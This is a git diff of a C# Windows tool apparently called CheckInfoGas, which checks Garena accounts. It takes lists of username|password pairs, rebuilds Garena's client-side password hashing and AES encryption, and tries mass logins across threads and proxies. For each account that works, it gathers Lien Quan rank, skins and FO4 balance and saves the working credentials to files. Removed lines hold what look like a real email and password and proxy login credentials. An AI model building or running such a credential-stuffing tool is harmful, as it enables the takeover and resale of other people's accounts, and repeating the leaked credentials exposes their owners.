@@ -68,26 +68,12 @@ namespace CheckInfoGas
 
         private void btnStart_Click(object sender, EventArgs e)
         {
-            CheckPerTask(null, "boyboykeypo@gmail.com", "boychua123");
             if (btnStart.Text == "Start")
             {
-                if (cbProxy.Checked)
+                if (!string.IsNullOrEmpty(FilePath))
                 {
-                    ApiKey = tbApiKey.Text;
-                    GetNewProxy(null, null);
-                    timer = new System.Timers.Timer(TimeSpan.FromMinutes(30).TotalMilliseconds);
-                    timer.Elapsed += GetNewProxy;
-                    timer.Start();
-                }
-                btnStart.Text = "Stop";
-                var proxy = tbProxy.Text;
-
-                CancellationTokenSource = new CancellationTokenSource();
-                if (!string.IsNullOrEmpty(FilePath) && !string.IsNullOrEmpty(proxy))
-                {
-                    Proxy = proxy;
                     int maxThread = (int)numThread.Value;
-                    Check(maxThread);
+                    CheckMulti(maxThread);
                 }
                 else if (string.IsNullOrEmpty(FilePath))
                 {
@@ -107,6 +93,7 @@ namespace CheckInfoGas
             }
         }
 
+        /*
         private async void Check(int maxThread)
         {
             await Task.Run(async () =>
@@ -144,7 +131,7 @@ namespace CheckInfoGas
                 MessageBox.Show("Xong");
             });
         }
-
+        
         private async Task CheckPerThread(DataGridViewRow row, string account, string password)
         {
             bool isSuccess = false;
@@ -199,12 +186,12 @@ namespace CheckInfoGas
                     if (response.Contains("error_user_ban"))
                     {
                         SetStatusDataGridView(row, "Ban Account");
-                        await WriteToFileAsync("Ban.txt", $"{account}|{password}");
+                        //await WriteToFileAsync("Ban.txt", $"{account}|{password}");
                     }
                     else if (response.Contains("error_auth"))
                     {
                         SetStatusDataGridView(row, "Wrong password");
-                        await WriteToFileAsync("WrongPass.txt", $"{account}|{password}");
+                        // WriteToFileAsync("WrongPass.txt", $"{account}|{password}");
                     }
                     else if (response.Contains("error_suspicious_ip"))
                     {
@@ -255,7 +242,7 @@ namespace CheckInfoGas
                                         if (hero.Length > 1)
                                         {
                                             var typeAccount = hero.Substring(0, 1) == "K" ? "KDX" : hero.Substring(0, 1) + "x";
-                                            await WriteToFileAsync($@"{Application.StartupPath}Lienquan\\LienQuan{typeAccount}.txt", $"{account}|{password}|{status}");
+                                            //await WriteToFileAsync($@"{Application.StartupPath}Lienquan\\LienQuan{typeAccount}.txt", $"{account}|{password}|{status}");
                                         }
                                     }
                                 }
@@ -268,13 +255,13 @@ namespace CheckInfoGas
 
                             if (!cbLQ.Checked && !cbInfo.Checked)
                             {
-                                await WriteToFileAsync("Success.txt", $"{account}|{password}");
+                                //await WriteToFileAsync("Success.txt", $"{account}|{password}");
                             }
                             else
                             {
                                 SetStatusDataGridView(row, status);
 
-                                await WriteToFileAsync($"{fileName}.txt", $"{account}|{password}|{status}");
+                                //await WriteToFileAsync($"{fileName}.txt", $"{account}|{password}|{status}");
                             }
                         }
                         else
@@ -295,60 +282,282 @@ namespace CheckInfoGas
                 }
             }
         }
+        */
+
+        public void CheckMulti(int maxThread)
+        {
+            (new Thread(() =>
+            {
+                int i = 0, iThread = 0;
+                while (i < Accounts.Count())
+                {
+                    if (iThread < maxThread)
+                    {
+                        int rowi = i;
+                        Interlocked.Increment(ref iThread);
+                        (new Thread(() =>
+                        {
+                            int add = 0;
+
+                            var account = Accounts[rowi];
+                            var accountInfo = account.Split('|');
+                            var username = accountInfo[0];
+                            var password = accountInfo[1];
+
+                            dgv.Invoke(new Action(() =>
+                            {
+                                add = dgv.Rows.Add(dgv.Rows.Count, username, password, "Running");
+                            }));
+                            DataGridViewRow row = dgv.Rows[add];
+
+                            CheckPerThread(row, username, password);
+                            Interlocked.Decrement(ref iThread);
+                        })).Start();
+                        Task.Delay(300);
+                        i++;
+                    }
+                    else
+                    {
+                        Task.Delay(1000);
+                    }
+                }
+            })).Start();
+        }
+
+        public Task RetryOnFailed(Action action)
+        {
+            return Task.Run(() =>
+            {
+                for (int i = 0; i < 5; i++)
+                {
+                    try
+                    {
+                        action();
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine(ex.Message);
+                    }
+                    finally
+                    {
+                        Task.Delay(300);
+                    }
+                }
+            });
+        }
 
         private Task CheckPerTask(DataGridViewRow row, string username, string password)
         {
-            //SetStatusDataGridView(row, "Get V1, v2");
-            string v1 = string.Empty, v2 = string.Empty;
-
-            for (int i = 0; i < 5; i++)
+            int x = 0;
+            while (x < 5)
             {
-                (v1, v2) = GetDataHashPassword(username);
-
-                if (!string.IsNullOrEmpty(v1) && !string.IsNullOrEmpty(v2) || v1.Equals("error_no_account"))
+                try
                 {
+                    SetStatusDataGridView(row, "Get V1, v2");
+                    string v1 = string.Empty, v2 = string.Empty;
+
+                    for (int i = 0; i < 5; i++)
+                    {
+                        (v1, v2) = GetDataHashPassword(username);
+
+                        if (!string.IsNullOrEmpty(v1) && !string.IsNullOrEmpty(v2) || v1.Equals("error_no_account"))
+                        {
+                            break;
+                        }
+
+                        Task.Delay(1000).Wait();
+                    }
+
+                    if (string.IsNullOrEmpty(v1) || string.IsNullOrEmpty(v2) || v1.Equals("error_no_account"))
+                    {
+                        SetStatusDataGridView(row, "V1, v2 is null");
+                        return Task.CompletedTask;
+                    }
+
+                    string encryptedPass = MaHoaPassGarena(
+                                MD5Hash(password),
+                                SHA256Hash(SHA256Hash(MD5Hash(password) + v1) + v2)
+                            );
+
+                    var (http, status) = Garena.CheckLogin(username, encryptedPass);
+
+                    var data = $"{username}|{password}";
+                    switch (status)
+                    {
+                        case Garena.StatusLogin.Ok:
+                            var userInfo = new UserInfo();
+                            var cookies = http.Cookies.ToDictionary();
+                            if (cbInfo.Checked)
+                            {
+                                SetStatusDataGridView(row, "Check info");
+                                userInfo = Garena.CheckInfoAccount(http, Proxy2);
+
+                            }
+
+                            if (cbLQ.Checked)
+                            {
+                                SetStatusDataGridView(row, "Check Lien Quan");
+                                Garena.CheckRankLQ(http, userInfo);
+                                var rank = string.IsNullOrEmpty(userInfo.LienQuanInfo.Rank) ? "0" : userInfo.LienQuanInfo.Rank;
+                                var skin = string.IsNullOrEmpty(userInfo.LienQuanInfo.Skin) ? "0" : userInfo.LienQuanInfo.Skin;
+                                data += $"|Rank:{rank}|Skin:{skin}";
+                                SetStatusDataGridView(row, $"Rank:{rank}|Skin:{skin}");
+                            }
+
+                            if (cbFo4.Checked)
+                            {
+                                SetStatusDataGridView(row, "Check FO4");
+                                Garena.LoginFCO(cookies, userInfo);
+                                var TeamValues = string.IsNullOrEmpty(userInfo.FO4Info.TeamValues) ? "0" : userInfo.FO4Info.TeamValues;
+                                var Balance = string.IsNullOrEmpty(userInfo.FO4Info.Balance) ? "0" : userInfo.FO4Info.Balance;
+                                data += $"|{TeamValues}|{Balance}";
+                            }
+
+                            if (userInfo.Status != null)
+                            {
+                                switch (userInfo.Status)
+                                {
+                                    case UserInfo.InfoStatus.FullTT:
+                                        WriteToFileAsync("FullTT.txt", data);
+                                        break;
+                                    case UserInfo.InfoStatus.Error_Email:
+                                        WriteToFileAsync("Error_Email.txt", data);
+                                        break;
+                                    case UserInfo.InfoStatus.TTT:
+                                        WriteToFileAsync("TTT.txt", data);
+                                        break;
+                                    case UserInfo.InfoStatus.NotExist:
+                                        WriteToFileAsync("NotExist.txt", data);
+                                        break;
+                                }
+                            }
+                            break;
+                        case Garena.StatusLogin.Ban:
+                            SetStatusDataGridView(row, "Ban Account");
+                            return Task.CompletedTask;
+                        case Garena.StatusLogin.Empty:
+                            SetStatusDataGridView(row, "Không có data");
+                            return Task.CompletedTask;
+                        case Garena.StatusLogin.Auth:
+                            SetStatusDataGridView(row, "Wrong password");
+                            return Task.CompletedTask;
+                        case Garena.StatusLogin.Spam:
+                            SetStatusDataGridView(row, "Spam ip");
+                            return Task.CompletedTask;
+                    }
+
                     break;
                 }
-
-                Task.Delay(1000).Wait();
+                catch { x++; }
             }
 
-            if (string.IsNullOrEmpty(v1) || string.IsNullOrEmpty(v2) || v1.Equals("error_no_account"))
-            {
-                //SetStatusDataGridView(row, "V1, v2 is null");
-                return Task.CompletedTask;
-            }
-
-            string encryptedPass = MaHoaPassGarena(
-                        MD5Hash(password),
-                        SHA256Hash(SHA256Hash(MD5Hash(password) + v1) + v2)
-                    );
-
-            var (http, status) = Garena.CheckLogin(username, encryptedPass);
-
-            switch (status)
-            {
-                case Garena.StatusLogin.Ok:
-                    var userInfo = Garena.CheckInfoAccount(http, "");
-                    var a = Garena.GetTokenGrant(http);
-                    Garena.LoginFCO(http, a);
-                    break;
-                case Garena.StatusLogin.Ban:
-                    //SetStatusDataGridView(row, "Ban Account");
-                    return Task.CompletedTask;
-                case Garena.StatusLogin.Empty:
-                    //SetStatusDataGridView(row, "Không có data");
-                    return Task.CompletedTask;
-                case Garena.StatusLogin.Auth:
-                    //SetStatusDataGridView(row, "Wrong password");
-                    return Task.CompletedTask;
-                case Garena.StatusLogin.Spam:
-                    //SetStatusDataGridView(row, "Spam ip");
-                    return Task.CompletedTask;
-            }
-
-            
             return Task.CompletedTask;
+        }
+
+        private void CheckPerThread(DataGridViewRow row, string username, string password)
+        {
+            int x = 0;
+            while (x < 5)
+            {
+                try
+                {
+                    SetStatusDataGridView(row, "Get V1, v2");
+                    string v1 = string.Empty, v2 = string.Empty;
+
+                    for (int i = 0; i < 5; i++)
+                    {
+                        (v1, v2) = GetDataHashPassword(username);
+
+                        if (!string.IsNullOrEmpty(v1) && !string.IsNullOrEmpty(v2) || v1.Equals("error_no_account"))
+                        {
+                            break;
+                        }
+
+                        Task.Delay(1000).Wait();
+                    }
+
+                    if (string.IsNullOrEmpty(v1) || string.IsNullOrEmpty(v2) || v1.Equals("error_no_account"))
+                    {
+                        SetStatusDataGridView(row, "V1, v2 is null");
+                        break;
+                    }
+
+                    string encryptedPass = MaHoaPassGarena(
+                                MD5Hash(password),
+                                SHA256Hash(SHA256Hash(MD5Hash(password) + v1) + v2)
+                            );
+
+                    var (http, status) = Garena.CheckLogin(username, encryptedPass);
+
+                    var data = $"{username}|{password}";
+                    switch (status)
+                    {
+                        case Garena.StatusLogin.Ok:
+                            var userInfo = new UserInfo();
+                            var cookies = http.Cookies.ToDictionary();
+                            if (cbInfo.Checked)
+                            {
+                                SetStatusDataGridView(row, "Check info");
+                                userInfo = Garena.CheckInfoAccount(http, Proxy2);
+
+                            }
+
+                            if (cbLQ.Checked)
+                            {
+                                SetStatusDataGridView(row, "Check Lien Quan");
+                                Garena.CheckRankLQ(http, userInfo);
+                                var rank = string.IsNullOrEmpty(userInfo.LienQuanInfo.Rank) ? "0" : userInfo.LienQuanInfo.Rank;
+                                var skin = string.IsNullOrEmpty(userInfo.LienQuanInfo.Skin) ? "0" : userInfo.LienQuanInfo.Skin;
+                                data += $"|Rank:{rank}|Skin:{skin}";
+                                SetStatusDataGridView(row, $"Rank:{rank}|Skin:{skin}");
+                            }
+
+                            if (cbFo4.Checked)
+                            {
+                                SetStatusDataGridView(row, "Check FO4");
+                                Garena.LoginFCO(cookies, userInfo);
+                                var TeamValues = string.IsNullOrEmpty(userInfo.FO4Info.TeamValues) ? "0" : userInfo.FO4Info.TeamValues;
+                                var Balance = string.IsNullOrEmpty(userInfo.FO4Info.Balance) ? "0" : userInfo.FO4Info.Balance;
+                                data += $"|{TeamValues}|{Balance}";
+                            }
+
+                            if (userInfo.Status != null)
+                            {
+                                switch (userInfo.Status)
+                                {
+                                    case UserInfo.InfoStatus.FullTT:
+                                        WriteToFileAsync("FullTT.txt", data);
+                                        break;
+                                    case UserInfo.InfoStatus.Error_Email:
+                                        WriteToFileAsync("Error_Email.txt", data);
+                                        break;
+                                    case UserInfo.InfoStatus.TTT:
+                                        WriteToFileAsync("TTT.txt", data);
+                                        break;
+                                    case UserInfo.InfoStatus.NotExist:
+                                        WriteToFileAsync("NotExist.txt", data);
+                                        break;
+                                }
+                            }
+                            break;
+                        case Garena.StatusLogin.Ban:
+                            SetStatusDataGridView(row, "Ban Account");
+                            break;
+                        case Garena.StatusLogin.Empty:
+                            SetStatusDataGridView(row, "Không có data");
+                            break;
+                        case Garena.StatusLogin.Auth:
+                            SetStatusDataGridView(row, "Wrong password");
+                            break;
+                        case Garena.StatusLogin.Spam:
+                            SetStatusDataGridView(row, "Spam ip");
+                            break;
+                    }
+
+                    break;
+                }
+                catch { x++; }
+            }
         }
 
         private void SetStatusDataGridView(DataGridViewRow row, string status)
@@ -359,7 +568,7 @@ namespace CheckInfoGas
             }));
         }
 
-        private async Task WriteToFileAsync(string fileName, string content)
+        private void WriteToFileAsync(string fileName, string content)
         {
             bool isSuccess = false;
             while (!isSuccess)
@@ -368,13 +577,13 @@ namespace CheckInfoGas
                 {
                     using (var sw = new StreamWriter(fileName, true))
                     {
-                        await sw.WriteLineAsync(content);
+                        sw.WriteLine(content);
                     }
                     isSuccess = true;
                 }
                 catch
                 {
-                    await Task.Delay(100);
+                    Task.Delay(100).Wait();
                 }
             }
         }
@@ -466,7 +675,7 @@ namespace CheckInfoGas
             var cookies = http.Cookies.ToDictionary(x => x.Key, x => x.Value);
             var sessionId = cookies.Where(x => x.Key.Equals("sessionid")).FirstOrDefault().Value;
             var csrfToken = cookies.Where(x => x.Key.Equals("csrftoken")).FirstOrDefault().Value;
-            HttpRequest httpRequest = new HttpRequest
+            HttpRequest httpRequest = new()
             {
                 Cookies = new CookieDictionary(),
                 UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
@@ -494,7 +703,7 @@ namespace CheckInfoGas
 
         private string MaHoaPassGarena(string plaintext, string key)
         {
-            using (AesManaged aes = new AesManaged())
+            using (AesManaged aes = new())
             {
                 aes.KeySize = 256;
                 aes.BlockSize = 128;
@@ -536,7 +745,7 @@ namespace CheckInfoGas
 
         private string ByteArrayToString(byte[] ba)
         {
-            StringBuilder hex = new StringBuilder(ba.Length * 2);
+            StringBuilder hex = new(ba.Length * 2);
             foreach (byte b in ba)
                 hex.AppendFormat("{0:x2}", b);
             return hex.ToString();
@@ -589,7 +798,6 @@ namespace CheckInfoGas
         {
             try
             {
-                Proxy = "as.lunaproxy.com:12233:user-apichaylq111-region-sg:apichaylq111";
                 var proxyRaw = Proxy.Split(':');
                 var http = new HttpRequest
                 {
@@ -714,7 +922,7 @@ namespace CheckInfoGas
         {
             string text = "";
 
-            System.Net.WebClient webClient = new WebClient();
+            System.Net.WebClient webClient = new();
             ServicePointManager.Expect100Continue = true;
             ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
             webClient.Headers[HttpRequestHeader.ContentType] = "application/json";
@@ -729,7 +937,7 @@ namespace CheckInfoGas
 
         private string GetDataDome()
         {
-            HttpRequest http = new HttpRequest
+            HttpRequest http = new()
             {
                 Cookies = new CookieDictionary(),
             };
